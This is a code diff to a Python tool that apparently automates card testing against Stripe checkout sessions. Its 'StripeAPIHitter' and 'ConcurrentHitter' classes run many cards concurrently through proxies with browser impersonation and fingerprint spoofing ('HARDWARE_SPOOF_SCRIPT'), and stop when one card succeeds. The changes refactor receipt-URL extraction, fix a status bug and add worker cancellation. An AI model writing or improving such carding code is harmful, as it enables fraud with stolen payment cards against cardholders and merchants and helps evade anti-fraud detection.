@@ -557,6 +557,21 @@ HARDWARE_SPOOF_SCRIPT = """
     fakeAudioContext(window.webkitAudioContext);
 """
 
+def find_receipt_url(d):
+    if isinstance(d, dict):
+        if 'receipt_url' in d and isinstance(d['receipt_url'], str) and d['receipt_url'].startswith('http'):
+            return d['receipt_url']
+        for v in d.values():
+            res = find_receipt_url(v)
+            if res:
+                return res
+    elif isinstance(d, list):
+        for item in d:
+            res = find_receipt_url(item)
+            if res:
+                return res
+    return None
+
 class StripeAPIHitter:
     def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
         self.pk_live = pk_live
@@ -765,19 +780,7 @@ class StripeAPIHitter:
                         
                     if status in ['succeeded', 'requires_capture', 'complete']:
                         result['success'] = True
-                        receipt_url = None
-                        if isinstance(pi, dict):
-                            charges = pi.get("charges", {}).get("data", [])
-                            if charges and isinstance(charges, list):
-                                receipt_url = charges[0].get("receipt_url")
-                        if not receipt_url and isinstance(confirm_json, dict):
-                            charges = confirm_json.get("charges", {}).get("data", [])
-                            if charges and isinstance(charges, list):
-                                receipt_url = charges[0].get("receipt_url")
-                        if not receipt_url and isinstance(confirm_json, dict):
-                            receipt_url = confirm_json.get("receipt_url")
-                        if not receipt_url and isinstance(pi, dict):
-                            receipt_url = pi.get("receipt_url")
+                        receipt_url = find_receipt_url(confirm_json)
                         if receipt_url:
                             result['receipt_url'] = receipt_url
                         return result
@@ -896,13 +899,7 @@ class StripeAPIHitter:
                                 status_2 = poll_json.get('status')
                                 if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                     result['success'] = True
-                                    receipt_url = None
-                                    if isinstance(poll_json, dict):
-                                        charges = poll_json.get("charges", {}).get("data", [])
-                                        if charges and isinstance(charges, list):
-                                            receipt_url = charges[0].get("receipt_url")
-                                        if not receipt_url:
-                                            receipt_url = poll_json.get("receipt_url")
+                                    receipt_url = find_receipt_url(poll_json)
                                     if receipt_url:
                                         result['receipt_url'] = receipt_url
                                 else:
@@ -916,18 +913,12 @@ class StripeAPIHitter:
                                             poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
                                             poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                             poll_json_3 = poll_res_3.json()
-                                            poll_status_3 = poll_res_3.get('status')
+                                            poll_status_3 = poll_json_3.get('status')
                                             
                                             if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
                                                 result['success'] = True
                                                 result['final_url'] = return_url or redirect_url
-                                                receipt_url = None
-                                                if isinstance(poll_json_3, dict):
-                                                    charges = poll_json_3.get("charges", {}).get("data", [])
-                                                    if charges and isinstance(charges, list):
-                                                        receipt_url = charges[0].get("receipt_url")
-                                                    if not receipt_url:
-                                                        receipt_url = poll_json_3.get("receipt_url")
+                                                receipt_url = find_receipt_url(poll_json_3)
                                                 if receipt_url:
                                                     result['receipt_url'] = receipt_url
                                                 return result
@@ -961,13 +952,7 @@ class StripeAPIHitter:
                                     if poll_status in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
                                         result['final_url'] = return_url or redirect_url
-                                        receipt_url = None
-                                        if isinstance(poll_json, dict):
-                                            charges = poll_json.get("charges", {}).get("data", [])
-                                            if charges and isinstance(charges, list):
-                                                receipt_url = charges[0].get("receipt_url")
-                                            if not receipt_url:
-                                                receipt_url = poll_json.get("receipt_url")
+                                        receipt_url = find_receipt_url(poll_json)
                                         if receipt_url:
                                             result['receipt_url'] = receipt_url
                                         return result
@@ -1165,10 +1150,21 @@ class ConcurrentHitter:
                             continue
                     break
                 
+                # Race-condition guard: if another worker succeeded while we were hitting, discard this failure result.
+                if not self.is_running and not result.get('success'):
+                    return
+                
                 self.completed += 1
                 if result['success']:
                     self.successes += 1
                     self.is_running = False
+                    
+                    # Cancel all other workers immediately to stop them
+                    current_task = asyncio.current_task()
+                    for w in getattr(self, 'workers', []):
+                        if w != current_task and not w.done():
+                            w.cancel()
+                            
                     while not queue.empty():
                         try:
                             queue.get_nowait()
@@ -1187,9 +1183,17 @@ class ConcurrentHitter:
                         "successes": self.successes,
                         "fails": self.fails
                     })
+            except asyncio.CancelledError:
+                # Worker was cancelled. Clean exit.
+                return
             except Exception as e:
                 import traceback
                 print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
+                
+                # Race-condition guard for exception block too
+                if not self.is_running:
+                    return
+                    
                 self.completed += 1
                 self.fails += 1
                 if self.update_callback:
@@ -1221,15 +1225,16 @@ class ConcurrentHitter:
         for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
             queue.put_nowait((card, idx+1))
             
-        workers = []
+        self.workers = []
         for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
             task = asyncio.create_task(self._worker(queue))
-            workers.append(task)
+            self.workers.append(task)
             
         await queue.join()
         
-        for w in workers:
-            w.cancel()
+        for w in self.workers:
+            if not w.done():
+                w.cancel()
             
         if self.update_callback:
             await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
